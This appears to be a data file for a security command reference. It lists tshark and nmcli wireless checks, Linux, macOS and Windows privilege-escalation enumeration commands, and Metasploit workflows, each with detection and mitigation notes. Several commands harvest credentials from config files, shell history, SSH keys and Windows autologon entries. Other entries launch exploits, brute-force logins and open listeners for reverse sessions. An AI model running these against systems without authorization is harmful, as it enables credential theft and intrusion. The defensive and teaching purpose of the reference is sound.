 {"id":"wifi-deauth-detect","cat":"Wireless Auditing","title":"Detect deauth/disassoc floods","desc":"Blue-team: watch for spoofed 802.11 deauthentication frames with a tshark monitor-mode filter.","danger":"Requires root and monitor mode; deploy on sensors you own within your own RF space.","team":"blue","tags":["wireless","detection","incident-response"],"attack":["T1498"],"detect":"High counts of type/subtype 0x0C (deauth) or 0x0A (disassoc) frames — especially spoofing the AP BSSID — indicate a deauth flood driving handshake capture.","mitigate":"Enable 802.11w PMF / WPA3 so forged management frames are dropped, and route sensor alerts into your SIEM.","code":{"linux":"sudo tshark -i {{IFACE:wlan0mon}} -Y \"wlan.fc.type_subtype == 0x0c\""}},
 {"id":"wifi-rogue-ap-detect","cat":"Wireless Auditing","title":"Spot evil-twin / duplicate SSIDs","desc":"Blue-team: list nearby APs sorted to reveal one SSID advertised by multiple/unexpected BSSIDs.","danger":"Read-only survey; still limit monitoring to your own RF environment.","team":"blue","tags":["wireless","detection","incident-response"],"attack":["T1557"],"detect":"A trusted SSID appearing under two BSSIDs, an unfamiliar OUI, or an anomalously strong signal for a known network points to a rogue/evil-twin AP.","mitigate":"Maintain an authorized-BSSID allowlist in WIPS, alert on deviations, and require certificate-validated WPA3/802.1X so clients won't trust the impostor.","code":{"linux":"nmcli -f SSID,BSSID,CHAN,SIGNAL dev wifi list | sort"}},

/* ================= PRIVILEGE-ESCALATION ENUMERATION ================= */
 {"id":"pe-linpeas","cat":"Privilege-Escalation Enumeration","title":"LinPEAS / macOS PEAS all-in-one audit","desc":"Run the LinPEAS (PEASS-ng) script to auto-enumerate local privilege-escalation paths; results to a file.","team":"red","tags":["privesc","enumeration","cross-platform"],"attack":["T1082","T1083"],"detect":"auditd/EDR sees one process spawning hundreds of read-only recon commands (id, find, getcap, ls -la on system dirs) in seconds; the script name 'linpeas' in process args and a large output file appearing in /tmp or /dev/shm.","mitigate":"Deploy execution logging (auditd execve, Sysmon-for-Linux) and alert on mass enumeration; restrict interactive shells; keep least-privilege so findings are empty.","danger":"Authorized assessments only. Noisy and unmistakably offensive; touches the whole filesystem and may trip EDR. Never run on systems you do not own or have written scope for.","code":{"linux":"# Assumes linpeas.sh is already on disk (offline kit)\nchmod +x linpeas.sh\n./linpeas.sh -a 2>&1 | tee \"/tmp/linpeas_$(date +%F_%H%M).txt\"","mac":"# The same PEASS-ng script includes macOS checks\nchmod +x linpeas.sh\n./linpeas.sh -a 2>&1 | tee \"/tmp/linpeas_$(date +%F_%H%M).txt\""}},
 {"id":"pe-winpeas","cat":"Privilege-Escalation Enumeration","title":"WinPEAS local privesc audit","desc":"Run WinPEAS (PEASS-ng) to enumerate Windows privilege-escalation vectors: services, tokens, creds, registry.","team":"red","tags":["privesc","enumeration","windows"],"attack":["T1082","T1083"],"detect":"Sysmon/EDR flags the winPEAS binary or .bat, rapid-fire reg/whoami/sc queries, and CIM/WMI service enumeration from one short-lived process; unusual output redirection to a text file.","mitigate":"Application allow-listing (WDAC/AppLocker) blocks the unsigned binary; enable Sysmon process + registry logging; enforce least privilege and patch to close the vectors it reports.","danger":"Authorized assessments only. Unsigned offensive tool, high-signal to EDR. Do not deploy outside a written engagement scope.","code":{"ps":"# winPEASx64.exe already staged (offline kit)\n.\\winPEASx64.exe log 2>&1 | Tee-Object -FilePath \".\\winpeas.txt\"","cmd":"winPEASx64.exe log > winpeas.txt 2>&1\ntype winpeas.txt"}},
 {"id":"pe-suid-sgid","cat":"Privilege-Escalation Enumeration","title":"Find SUID / SGID binaries","desc":"List setuid/setgid executables to cross-reference against GTFOBins for privilege escalation.","team":"red","tags":["privesc","enumeration","cross-platform"],"attack":["T1548.001","T1083"],"detect":"Filesystem-wide 'find -perm -4000' walk generates a burst of getattr/open syscalls; auditd file-scan rules and EDR flag full-tree traversal by a non-service user.","mitigate":"Audit and minimise the SUID set (dpkg-statoverride / remove the bit where not needed); mount user-writable filesystems nosuid; alert on new SUID files.","danger":"Read-only enumeration, but a precursor to escalation. Authorized use only.","code":{"linux":"find / -xdev -type f \\( -perm -4000 -o -perm -2000 \\) -exec ls -la {} \\; 2>/dev/null","mac":"find / -xdev -type f \\( -perm -4000 -o -perm -2000 \\) -exec ls -la {} \\; 2>/dev/null"}},
 {"id":"pe-capabilities","cat":"Privilege-Escalation Enumeration","title":"Enumerate Linux file capabilities","desc":"List binaries carrying POSIX capabilities (e.g. cap_setuid) that can grant root without the SUID bit.","team":"red","tags":["privesc","enumeration","linux"],"attack":["T1548.001"],"detect":"'getcap -r /' triggers a full-filesystem walk visible to auditd/EDR; rare for interactive users to enumerate capabilities.","mitigate":"Keep the capability inventory minimal; strip cap_setuid/cap_dac_override from unexpected binaries; monitor setcap use and new capability grants.","danger":"Read-only. Linux only (getcap is part of libcap). Authorized use only.","code":{"linux":"getcap -r / 2>/dev/null"}},
 {"id":"pe-sudo-l","cat":"Privilege-Escalation Enumeration","title":"List sudo rights for current user","desc":"Show which commands the current user may run via sudo; cross-check allowed binaries against GTFOBins.","team":"red","tags":["privesc","enumeration","account"],"attack":["T1548.003"],"detect":"sudo logs every invocation (including 'sudo -l') to authpriv/journal; SIEM can alert on -l enumeration or NOPASSWD entries being listed.","mitigate":"Scope sudoers tightly, avoid NOPASSWD and shell-spawning binaries; require a password; review /etc/sudoers.d regularly.","danger":"May prompt for a password and is logged. Authorized use only.","code":{"linux":"sudo -ln 2>/dev/null || sudo -l","mac":"sudo -ln 2>/dev/null || sudo -l"}},
 {"id":"pe-sudo-version","cat":"Privilege-Escalation Enumeration","title":"Check sudo version for known CVEs","desc":"Print the sudo version to match against known vulnerabilities (e.g. Baron Samedit / CVE-2021-3156).","team":"red","tags":["privesc","enumeration","reference"],"attack":["T1082"],"detect":"Benign on its own; correlate with other privesc-enumeration commands from the same session to surface intent.","mitigate":"Patch sudo promptly; track installed package versions in your vuln-management pipeline.","danger":"Read-only version banner. Authorized use only.","code":{"linux":"sudo --version | head -n1","mac":"sudo --version | head -n1"}},
 {"id":"pe-cron-enum","cat":"Privilege-Escalation Enumeration","title":"Enumerate cron jobs & writable scripts","desc":"List system and user cron entries and flag any referenced scripts a low-priv user can modify.","team":"red","tags":["privesc","enumeration","scheduling"],"attack":["T1053.003"],"detect":"Reads of /etc/crontab and /etc/cron.* plus 'crontab -l' by a normal user; alert on world-writable files invoked by root cron.","mitigate":"Ensure cron-referenced scripts are root-owned and non-writable by others; audit /etc/cron.d; use absolute paths in cron.","danger":"Read-only enumeration. Authorized use only.","code":{"linux":"crontab -l 2>/dev/null\nls -la /etc/crontab /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ 2>/dev/null\ncat /etc/crontab 2>/dev/null\nfind /etc/cron* -type f -perm -0002 2>/dev/null -exec ls -la {} \\;"}},
 {"id":"pe-systemd-writable","cat":"Privilege-Escalation Enumeration","title":"Writable systemd units & timers","desc":"Find systemd service/timer unit files or their ExecStart targets that a non-root user can edit.","team":"red","tags":["privesc","enumeration","linux"],"attack":["T1053.006","T1574.010"],"detect":"'-writable' find walks over /etc/systemd and /lib/systemd; auditd can watch those paths for read/scan and for actual writes.","mitigate":"Unit files must be root-owned and 0644; audit drop-in dirs (*.d); alert on new/edited units; run 'systemd-analyze security' to tighten services.","danger":"Read-only enumeration (find -writable is GNU/Linux). Authorized use only.","code":{"linux":"find /etc/systemd/ /lib/systemd/ /run/systemd/ -writable -type f 2>/dev/null\nsystemctl list-timers --all 2>/dev/null"}},
 {"id":"pe-path-hijack","cat":"Privilege-Escalation Enumeration","title":"Writable $PATH directory check","desc":"Flag any directory in $PATH the current user can write to (PATH-hijack / binary-planting risk).","team":"red","tags":["privesc","enumeration","cross-platform"],"attack":["T1574.007"],"detect":"Hard to see the check itself; detect the abuse — new executables appearing in PATH dirs, or privileged processes resolving binaries from user-writable locations.","mitigate":"Remove writable/relative entries (., ~) from system PATH; keep PATH dirs root-owned; use absolute paths in privileged scripts.","danger":"Read-only enumeration. Authorized use only.","code":{"linux":"IFS=:; for d in $PATH; do [ -d \"$d\" ] && [ -w \"$d\" ] && echo \"WRITABLE: $d\"; done","mac":"IFS=:; for d in $PATH; do [ -d \"$d\" ] && [ -w \"$d\" ] && echo \"WRITABLE: $d\"; done"}},
 {"id":"pe-world-writable","cat":"Privilege-Escalation Enumeration","title":"World-writable files & directories","desc":"Locate world-writable files/dirs (excluding sticky-bit temp dirs) that could enable tampering or escalation.","team":"red","tags":["privesc","enumeration","cross-platform"],"attack":["T1083"],"detect":"Full-tree 'find -perm -0002' walk visible to auditd/EDR as a mass stat sweep.","mitigate":"Tighten permissions (chmod o-w); add the sticky bit to shared dirs; baseline the filesystem and alert on new world-writable objects.","danger":"Read-only enumeration. Authorized use only.","code":{"linux":"find / -xdev -type f -perm -0002 -not -path '/proc/*' 2>/dev/null\nfind / -xdev -type d -perm -0002 ! -perm -1000 2>/dev/null","mac":"find / -xdev -type f -perm -0002 2>/dev/null\nfind / -xdev -type d -perm -0002 ! -perm -1000 2>/dev/null"}},
 {"id":"pe-kernel-version","cat":"Privilege-Escalation Enumeration","title":"Kernel version for exploit matching","desc":"Print exact kernel/build to match against known local-privesc kernel vulnerabilities.","team":"red","tags":["privesc","enumeration","reference"],"attack":["T1082"],"detect":"Benign in isolation; value comes from correlating with a broader enumeration session.","mitigate":"Keep kernels patched; track kernel build in vuln management; enable live-patching where available.","danger":"Read-only. Authorized use only.","code":{"linux":"uname -a\ncat /proc/version","mac":"uname -a\nsysctl kern.version"}},
 {"id":"pe-os-version","cat":"Privilege-Escalation Enumeration","title":"OS build & patch level","desc":"Read the OS release/build and (Windows) installed hotfixes to identify missing patches.","team":"red","tags":["privesc","enumeration","reference"],"attack":["T1082"],"detect":"Benign individually; 'systeminfo'/hotfix queries alongside other recon are a weak privesc-enumeration signal.","mitigate":"Maintain patch SLAs; centralise build/patch inventory; minimise info leaked to unprivileged users where feasible.","danger":"Read-only. Authorized use only.","code":{"ps":"Get-ComputerInfo -Property OsName,OsVersion,OsBuildNumber,WindowsProductName\nGet-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 15 HotFixID,InstalledOn","cmd":"systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"\nwmic qfe get HotFixID,InstalledOn","linux":"cat /etc/os-release","mac":"sw_vers"}},
 {"id":"pe-stored-creds-grep","cat":"Privilege-Escalation Enumeration","title":"Grep filesystem for stored credentials","desc":"Recursively search common config locations for hard-coded passwords, secrets, and tokens.","team":"red","tags":["privesc","enumeration","password"],"attack":["T1552.001"],"detect":"Recursive grep across /etc, /home, /var/www generates broad read activity; auditd file-access rules and DLP can flag bulk reads of config/secret files.","mitigate":"Move secrets to a vault/secret manager; restrict config file perms; rotate any credential that ever sat in plaintext on disk.","danger":"Read-only, but discloses credentials. Authorized use only.","code":{"linux":"grep -rniI --include='*.conf' --include='*.cnf' --include='*.ini' --include='*.xml' --include='*.yml' --include='*.yaml' --include='*.env' --include='*.php' -e password -e passwd -e secret -e api_key /etc /home /var/www /opt 2>/dev/null | head -n 50","mac":"grep -rniI --include='*.conf' --include='*.cnf' --include='*.ini' --include='*.xml' --include='*.yml' --include='*.yaml' --include='*.env' --include='*.php' -e password -e passwd -e secret -e api_key /etc /Users /Library 2>/dev/null | head -n 50"}},
 {"id":"pe-history-creds","cat":"Privilege-Escalation Enumeration","title":"Harvest secrets from shell history","desc":"Scan bash/zsh history for passwords, tokens, and credentialed one-liners.","team":"red","tags":["privesc","enumeration","password"],"attack":["T1552.003"],"detect":"Reads of ~/.bash_history / ~/.zsh_history; watch for cross-user history access (another user's home) which requires elevated rights.","mitigate":"Avoid secrets on the command line; set HISTIGNORE / HISTCONTROL; keep history files 0600; educate users to use env files or vaults.","danger":"Read-only, but discloses credentials. Authorized use only.","code":{"linux":"cat ~/.bash_history ~/.zsh_history 2>/dev/null | grep -iE 'pass|passwd|secret|token|api[_-]?key|mysql|psql|ssh|curl.*-u' | sort -u","mac":"cat ~/.zsh_history ~/.bash_history 2>/dev/null | grep -iE 'pass|passwd|secret|token|api[_-]?key|mysql|psql|ssh|curl.*-u' | sort -u"}},
 {"id":"pe-ssh-keys","cat":"Privilege-Escalation Enumeration","title":"Locate private SSH keys","desc":"Find readable private keys usable for lateral movement or escalation to other accounts/hosts.","team":"red","tags":["privesc","enumeration","password"],"attack":["T1552.004"],"detect":"Filesystem-wide search for id_rsa/*.pem and reads outside the user's own ~/.ssh; auditd can watch .ssh directories for cross-user access.","mitigate":"Passphrase-protect keys, keep them 0600 and owner-scoped; prefer short-lived certs/agents; rotate exposed keys immediately.","danger":"Read-only, but exposes authentication material. Authorized use only.","code":{"linux":"find / -xdev \\( -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' -o -name '*.pem' \\) 2>/dev/null\ngrep -rlI 'PRIVATE KEY' /home /root /etc 2>/dev/null","mac":"find / -xdev \\( -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' -o -name '*.pem' \\) 2>/dev/null\ngrep -rlI 'PRIVATE KEY' /Users 2>/dev/null"}},
 {"id":"pe-nfs-rootsquash","cat":"Privilege-Escalation Enumeration","title":"Check NFS exports for no_root_squash","desc":"Inspect NFS exports for no_root_squash, which lets a remote root write setuid files. Uses showmount (nfs-common).","team":"red","tags":["privesc","enumeration","network"],"attack":["T1083"],"detect":"Reads of /etc/exports and 'showmount -e' RPC queries to the NFS server; monitor for unexpected export enumeration.","mitigate":"Use root_squash on all exports; restrict exports by host/subnet and read-only where possible; mount client shares nosuid.","danger":"Read-only enumeration. Authorized use only.","code":{"linux":"cat /etc/exports 2>/dev/null\nshowmount -e localhost 2>/dev/null\nshowmount -e {{NFS_HOST:127.0.0.1}} 2>/dev/null"}},
 {"id":"pe-docker-group","cat":"Privilege-Escalation Enumeration","title":"Check for privesc group memberships","desc":"Determine if the current user is in docker/lxd/disk or other groups that trivially grant root.","team":"red","tags":["privesc","enumeration","account"],"attack":["T1069.001"],"detect":"'id'/'groups' calls are common, but subsequent 'docker run -v /:/host' or lxd image import is a strong escalation indicator to watch.","mitigate":"Treat docker/lxd/disk group membership as root-equivalent — restrict it; use rootless containers; audit group changes.","danger":"Read-only enumeration. Authorized use only.","code":{"linux":"id\ngroups\nfor g in docker lxd lxc disk adm sudo wheel; do getent group \"$g\" 2>/dev/null; done"}},
 {"id":"pe-whoami-priv","cat":"Privilege-Escalation Enumeration","title":"Enumerate Windows token privileges","desc":"List the current token's privileges (SeImpersonate, SeBackup, SeDebug) that enable escalation techniques.","team":"red","tags":["privesc","enumeration","windows"],"attack":["T1134"],"detect":"'whoami /priv' and /all are quick and quiet; correlate with a follow-on service/token-abuse process in Sysmon.","mitigate":"Remove dangerous privileges from service accounts; avoid running services as accounts holding SeImpersonate; monitor for potato-style token abuse.","danger":"Read-only enumeration. Authorized use only.","code":{"ps":"whoami /priv\nwhoami /groups","cmd":"whoami /priv\nwhoami /groups"}},
 {"id":"pe-unquoted-service-path","cat":"Privilege-Escalation Enumeration","title":"Find unquoted service paths","desc":"List services whose ImagePath has spaces and no quotes, allowing binary planting in a parent directory.","team":"red","tags":["privesc","enumeration","windows"],"attack":["T1574.009"],"detect":"CIM/WMI Win32_Service enumeration from a non-admin process; the real signal is a new .exe written to C:\\Program.exe or a service parent dir.","mitigate":"Quote all service ImagePaths; restrict write access to service install directories; audit for unquoted paths at build time.","danger":"Read-only enumeration. Authorized use only.","code":{"ps":"Get-CimInstance Win32_Service |\n  Where-Object { $_.PathName -match ' ' -and $_.PathName -notmatch '^\\\"' -and $_.PathName -notmatch '^[A-Za-z]:\\\\Windows' } |\n  Select-Object Name, StartMode, StartName, PathName | Format-List"}},
 {"id":"pe-alwaysinstallelevated","cat":"Privilege-Escalation Enumeration","title":"Check AlwaysInstallElevated policy","desc":"Test whether MSI packages install as SYSTEM (both HKLM and HKCU keys set to 1) — a direct escalation path.","team":"red","tags":["privesc","enumeration","registry"],"attack":["T1548"],"detect":"Reads of the Installer policy keys, then an msiexec launch of a user-supplied .msi running as SYSTEM — flag msiexec spawning shells.","mitigate":"Never enable AlwaysInstallElevated via GPO; if set, remove both HKLM and HKCU values; restrict who can run installers.","danger":"Read-only enumeration of policy state. Authorized use only.","code":{"ps":"Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue\nGet-ItemProperty 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue","cmd":"reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul"}},
 {"id":"pe-stored-creds-windows","cat":"Privilege-Escalation Enumeration","title":"Windows stored credentials & autologon","desc":"List saved Credential Manager entries and check the registry for a plaintext autologon password.","team":"red","tags":["privesc","enumeration","password"],"attack":["T1552.002","T1555.004"],"detect":"'cmdkey /list' plus reads of the Winlogon key; alert on DefaultPassword reads and on runas /savecred usage of stored blobs.","mitigate":"Avoid autologon/DefaultPassword; clear stale cmdkey entries; use LAPS and gMSA; store secrets in a managed vault.","danger":"Read-only, but reveals credentials. Authorized use only.","code":{"ps":"cmdkey /list\nGet-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' |\n  Select-Object DefaultUserName, DefaultDomainName, DefaultPassword, AutoAdminLogon","cmd":"cmdkey /list\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword 2>nul\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon 2>nul"}},
 {"id":"pe-scheduled-tasks","cat":"Privilege-Escalation Enumeration","title":"Enumerate scheduled tasks & run-as","desc":"List scheduled tasks and the accounts they run as to find tasks executing writable binaries as SYSTEM.","team":"red","tags":["privesc","enumeration","scheduling"],"attack":["T1053.005"],"detect":"'schtasks /query /v' or Get-ScheduledTask enumeration; the escalation signal is a task's action binary/dir being modifiable by a low-priv user.","mitigate":"Ensure task action binaries are in protected, non-writable paths; run tasks with least privilege; audit task creation (Event ID 4698).","danger":"Read-only enumeration. Authorized use only.","code":{"ps":"Get-ScheduledTask | Where-Object State -ne 'Disabled' |\n  ForEach-Object { [pscustomobject]@{ Name=$_.TaskName; Path=$_.TaskPath; RunAs=$_.Principal.UserId; Action=($_.Actions.Execute -join ';') } } |\n  Format-Table -AutoSize","cmd":"schtasks /query /fo LIST /v | findstr /i \"TaskName Run:As Task To Run\""}},

/* ================= EXPLOITATION FRAMEWORKS ================= */
 {"id":"exp-msfconsole-launch","cat":"Exploitation Frameworks","title":"Launch the Metasploit console","desc":"Start msfconsole (Metasploit Framework); -q suppresses the banner for scripting.","danger":"Authorized use only. Metasploit is offensive tooling; run it against systems you own or have written permission to test.","tags":["exploitation","tools","reference"],"code":{"linux":"# Interactive console\nmsfconsole\n\n# Quiet start (no banner), then show version\nmsfconsole -q -x 'version; exit'","mac":"# Installed via: brew install --cask metasploit\nmsfconsole -q"}},
 {"id":"exp-msfdb-init","cat":"Exploitation Frameworks","title":"Initialize the Metasploit database","desc":"Set up the PostgreSQL-backed msf database so hosts, services, and loot persist across sessions.","danger":"Needs a running PostgreSQL service and appropriate privileges. Database stores scan results and captured credentials in plaintext-adjacent form; protect it.","tags":["exploitation","tools"],"code":{"linux":"# One-time database setup (Kali/Debian)\nsudo msfdb init\n\n# Check connection from inside msfconsole\nmsfconsole -q -x 'db_status; exit'"}},
 {"id":"exp-msf-workspace","cat":"Exploitation Frameworks","title":"Organize engagements with workspaces","desc":"Separate hosts/services/loot per engagement using msfconsole workspaces.","tags":["exploitation","reference"],"code":{"linux":"# Run inside msfconsole:\nworkspace                       # list workspaces\nworkspace -a {{ENGAGEMENT:client-2026}}   # add and switch\nworkspace {{ENGAGEMENT:client-2026}}      # switch to it\nworkspace -d {{ENGAGEMENT:old-test}}      # delete one"}},
 {"id":"exp-msf-search","cat":"Exploitation Frameworks","title":"Search for modules","desc":"Find exploit, auxiliary, and post modules by keyword, CVE, platform, or type inside msfconsole.","tags":["exploitation","recon","reference"],"code":{"linux":"# Run inside msfconsole:\nsearch type:auxiliary smb\nsearch cve:{{CVE:2021-34527}}\nsearch platform:windows type:exploit rank:excellent\nsearch name:{{KEYWORD:eternalblue}}\ninfo {{MODULE:auxiliary/scanner/smb/smb_version}}"}},
 {"id":"exp-msf-use-options","cat":"Exploitation Frameworks","title":"Select a module and review options","desc":"Load a module with use, then inspect required settings with show options / info.","tags":["exploitation","reference"],"code":{"linux":"# Run inside msfconsole:\nuse {{MODULE:auxiliary/scanner/smb/smb_version}}\ninfo                 # description, references, options\nshow options         # required (yes) vs optional settings\nshow missing         # only the still-unset required options"}},
 {"id":"exp-msf-set-options","cat":"Exploitation Frameworks","title":"Set module options","desc":"Assign target, threads, and other datastore values before running a module.","tags":["exploitation","reference"],"code":{"linux":"# Run inside the loaded module:\nset RHOSTS {{TARGET:10.0.0.0/24}}\nset RPORT {{PORT:445}}\nset THREADS 20\nunset RPORT          # revert one option to default\nsetg RHOSTS {{TARGET:10.0.0.0/24}}   # set globally for all modules"}},
 {"id":"exp-msf-check","cat":"Exploitation Frameworks","title":"Verify a target is vulnerable (check)","desc":"Use a module's check action to probe for a vulnerability without launching the exploit.","danger":"Authorized use only. check still sends crafted probes that can be logged, alerted on, or occasionally destabilize fragile services.","team":"red","attack":["T1210"],"detect":"IDS/WAF signatures fire on the anomalous protocol handshake or crafted request; application logs show malformed/unexpected input from a single source; unusual short-lived connections to the vulnerable service port.","mitigate":"Patch the underlying vulnerability, apply virtual patching / WAF rules, reduce external exposure of the service, and monitor for exploit-check signatures.","tags":["exploitation","scanning"],"code":{"linux":"# Run inside the loaded exploit module:\nset RHOSTS {{RHOST:10.0.0.5}}\ncheck                # reports Vulnerable / Safe / Unknown without exploiting"}},
 {"id":"exp-msf-run-exploit","cat":"Exploitation Frameworks","title":"Exploit workflow (use / set / check / run)","desc":"Generic module-run workflow: load a module, set target and listener, verify, then run — no specific CVE.","danger":"Authorized use only. Launching an exploit can crash services, corrupt data, and constitutes unauthorized access without explicit written permission. Supply your own {{MODULE}}.","team":"red","attack":["T1210"],"detect":"Suricata/Snort exploit-attempt rules (ET set); target service crash, restart, or unexpected child process; EDR alerts on memory injection or a new outbound reverse connection to the LHOST; spike in error logs immediately before a new session.","mitigate":"Patch aggressively, deploy EDR with memory-injection detection, segment networks, disable unused services, and enforce egress filtering so reverse callbacks fail.","tags":["exploitation","remote"],"code":{"linux":"# Run inside msfconsole (generic workflow, supply your own module):\nuse {{MODULE:exploit/path/to/module}}\nset RHOSTS {{RHOST:10.0.0.5}}\nset LHOST {{LHOST:10.0.0.10}}\nshow options\ncheck\nrun                  # 'exploit' is an alias for run\nexploit -j -z        # run as background job, do not interact"}},
 {"id":"exp-msf-auxiliary-scanner","cat":"Exploitation Frameworks","title":"Run an auxiliary scanner","desc":"Use auxiliary/scanner modules for port, service, and version discovery across a range.","danger":"Authorized use only. Scanning networks you do not own or lack permission to test may be illegal and is easily detected.","team":"red","attack":["T1046"],"detect":"Network sensors (Zeek conn.log, Suricata scan alerts) flag one source touching many ports/hosts in a short window; firewall/flow logs show fan-out connection attempts; honeypots record the probes.","mitigate":"Segment networks, rate-limit and log connection attempts, deploy IDS scan-detection, and minimize the externally reachable service surface.","tags":["exploitation","scanning","discovery"],"code":{"linux":"# Run inside msfconsole:\nuse auxiliary/scanner/portscan/tcp\nset RHOSTS {{TARGET:10.0.0.0/24}}\nset PORTS 1-1024\nset THREADS 20\nrun\n\n# Service-specific version scan example\nuse auxiliary/scanner/smb/smb_version\nset RHOSTS {{TARGET:10.0.0.0/24}}\nrun"}},
 {"id":"exp-msf-auxiliary-login","cat":"Exploitation Frameworks","title":"Auxiliary credential (login) scanners","desc":"Use auxiliary/scanner/*/*_login modules to test credentials against a service — authorized use only.","danger":"Authorized use only. Online credential guessing triggers lockouts, is noisy, and is unlawful without explicit written permission. Prefer provided credential lists over large wordlists.","team":"red","attack":["T1110.001","T1110.003"],"detect":"Authentication logs show many failed logins from one source, account lockouts, and rapid sequential attempts across usernames; SIEM brute-force correlation rules fire; service-specific auth failure spikes.","mitigate":"Enforce account lockout/backoff, MFA, strong unique passwords, network-level throttling (fail2ban), and alert on failed-auth thresholds.","tags":["exploitation","password"],"code":{"linux":"# Run inside msfconsole (example: SSH):\nuse auxiliary/scanner/ssh/ssh_login\nset RHOSTS {{TARGET:10.0.0.5}}\nset USER_FILE {{USERS:/path/users.txt}}\nset PASS_FILE {{PASS:/path/pass.txt}}\nset STOP_ON_SUCCESS true\nset VERBOSE false\nrun"}},
 {"id":"exp-msf-db-nmap","cat":"Exploitation Frameworks","title":"Import scans with db_nmap and db_import","desc":"Run Nmap from msfconsole so results land directly in the workspace database, or import an existing scan.","danger":"Authorized use only. db_nmap runs a real Nmap scan against the target; unauthorized scanning may be illegal.","team":"red","attack":["T1046"],"detect":"Same footprint as any Nmap scan — IDS scan alerts, connection fan-out in flow logs, and unusual SYN volume from one source.","mitigate":"IDS scan detection, network segmentation, and reducing exposed services; treat repeated scanning as reconnaissance and investigate.","tags":["exploitation","scanning","discovery"],"code":{"linux":"# Run inside msfconsole:\ndb_nmap -sV -T4 {{TARGET:10.0.0.0/24}}\n\n# Or import a scan produced elsewhere\ndb_import {{FILE:/path/scan.xml}}"}},
 {"id":"exp-msf-hosts-services","cat":"Exploitation Frameworks","title":"Query hosts, services, and vulns from the database","desc":"Review discovered assets stored in the workspace with hosts, services, and vulns.","tags":["exploitation","enumeration","reference"],"code":{"linux":"# Run inside msfconsole:\nhosts                          # all discovered hosts\nhosts -c address,os_name,name  # selected columns\nservices -p 445                # everything listening on 445\nservices -u                    # only up services\nvulns                          # vulnerabilities mapped to hosts"}},
 {"id":"exp-msf-sessions","cat":"Exploitation Frameworks","title":"Manage active sessions","desc":"List, interact with, background, and kill open sessions from msfconsole.","danger":"Authorized use only. An active session is live access to a target; killing/backgrounding affects a real remote host.","team":"red","attack":["T1219"],"detect":"Long-lived or beaconing outbound connections to an operator LHOST; EDR flags in-memory session agents; unexpected reverse TCP/HTTPS to non-business destinations; new processes without a parent GUI/service.","mitigate":"Egress filtering and TLS inspection to break reverse callbacks, EDR with memory/behavior detection, application allowlisting, and network segmentation to limit reach.","tags":["exploitation","post-ex","remote"],"code":{"linux":"# Run inside msfconsole:\nsessions -l              # list active sessions\nsessions -i {{ID:1}}     # interact with a session\n# (inside a session, press Ctrl+Z or type: background)\nsessions -k {{ID:1}}     # kill a session\nsessions -K              # kill ALL sessions"}},
 {"id":"exp-msf-meterpreter-basics","cat":"Exploitation Frameworks","title":"Meterpreter enumeration basics","desc":"Read-only host enumeration from a Meterpreter session (sysinfo/getuid/ps) — no privilege escalation payloads.","danger":"Authorized use only. These commands run on a live compromised host; only operate within an approved engagement scope.","team":"red","attack":["T1082","T1057"],"detect":"Meterpreter has recognizable in-memory artifacts and named-pipe / API-call patterns; EDR and memory scanners (e.g. Volatility, YARA meterpreter rules) flag it; enumeration bursts (system info + process list) shortly after a new session appears.","mitigate":"EDR with in-memory detection, application allowlisting, least-privilege accounts, and egress filtering to cut the session's C2 channel.","tags":["post-ex","enumeration","exploitation"],"code":{"linux":"# Run inside a Meterpreter session:\nsysinfo          # OS, architecture, hostname\ngetuid           # current user context\ngetpid           # host process id\nps               # running processes\nipconfig         # interfaces and addresses\nbackground       # return to msfconsole, keep session"}},
 {"id":"exp-msf-post-modules","cat":"Exploitation Frameworks","title":"Run post-exploitation enumeration modules","desc":"Use post/ modules for read-only host recon (logged-on users, installed software, missing-patch suggester).","danger":"Authorized use only. Post modules act on a live session against a real host; keep to enumeration modules within scope.","team":"red","attack":["T1082","T1518"],"detect":"EDR/audit logs show enumeration activity (WMI/registry/API sweeps) originating from an anomalous process; a burst of recon shortly after session establishment; script/module artifacts written to temp paths.","mitigate":"EDR behavioral detection, PowerShell/script-block and process-creation logging, least privilege, and alerting on rapid host-recon sequences.","tags":["post-ex","enumeration","windows"],"code":{"linux":"# Run inside msfconsole with an active session:\nuse post/multi/recon/local_exploit_suggester\nset SESSION {{ID:1}}\nrun\n\nuse post/windows/gather/enum_logged_on_users\nset SESSION {{ID:1}}\nrun"}},
 {"id":"exp-msf-jobs-handler","cat":"Exploitation Frameworks","title":"Background jobs and multi/handler listener","desc":"Start a generic listener as a background job and manage running jobs with jobs.","danger":"Authorized use only. A handler opens a listening socket to receive incoming sessions; only run within an approved engagement.","team":"red","attack":["T1071","T1571"],"detect":"Host listening on an unexpected/non-standard port; inbound connections from internal hosts to an operator system; NetFlow shows a new persistent listener and matching reverse connections.","mitigate":"Ingress/egress filtering, host firewall allowlists, and alerting on new listening ports or connections to non-standard ports.","tags":["exploitation","remote","post-ex"],"code":{"linux":"# Run inside msfconsole:\nuse exploit/multi/handler\nset LHOST {{LHOST:10.0.0.10}}\nset LPORT {{LPORT:4444}}\nexploit -j            # run as background job\n\njobs -l               # list running jobs\njobs -k {{JOBID:0}}   # kill a job"}},
